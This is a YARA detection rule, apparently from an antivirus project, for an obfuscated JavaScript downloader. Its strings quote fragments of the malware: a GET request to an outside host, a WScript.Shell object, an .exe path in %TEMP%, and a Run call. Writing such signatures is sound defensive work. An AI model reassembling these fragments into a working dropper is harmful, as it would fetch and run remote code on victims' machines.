rule sig_20160401_ea7ae6b439b64a62470293d2ad191454 {
  meta:
    description = "datamaliciousorder - file 20160401_ea7ae6b439b64a62470293d2ad191454.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1292e6e3aeab8883a0da13de1b2d3e6ba38a2d62cea61e2d82262bfc6c35658f"

  strings:
    $s1  = "FnXyg[LnOvd](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "function FzPs(NcjTj, QwCs){ZfAm = ZfAm * 1; return NcjTj - QwCs;};" fullword ascii
    $s3  = "var UoMxe = function RbRhn() {return WScript[DnIe](\"WScript\"+\".Shell\");}(), HeSo = 11;" fullword ascii
    $s4  = "if (FnXyg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OrTns() {return UoMxe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"wiJXxZayF0e.ex\" + \"e\";};" fullword ascii
    $s6  = "function JlVj(){return MpiCp + \"\";};" fullword ascii
    $s7  = "function IbrLu() {return ((VpaDly == true) && (VpaDly == RvlXlj)) ? 1 : ZfAm;};" fullword ascii
    $s8  = "var VpaDly = false;" fullword ascii
    $s9  = "return FzPs(EwSj, LfeMwp);" fullword ascii
    $s10 = "function PgvLko()" fullword ascii
    $s11 = "}while (EnnMp);" fullword ascii
    $s12 = "function SshApm(){return DnIe;};" fullword ascii
    $s13 = "var YxEcf = false;" fullword ascii
    $s14 = "var XjDj = new this[\"Date\"]();" fullword ascii
    $s15 = "var RvlXlj = false;" fullword ascii
    $s16 = "VpaDly = true; " fullword ascii
    $s17 = "function RkKvl(){return 23;};" fullword ascii
    $s18 = "function UxVuw(VkXi){UoMxe[\"R\"+\"un\"](VkXi, ZfAm, ZfAm);};" fullword ascii
    $s19 = "function QnZma(DhmZr) {var FaIra = (1, 2, 3, 4, 5, DhmZr); return FaIra;};" fullword ascii
    $s20 = "RvlXlj = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}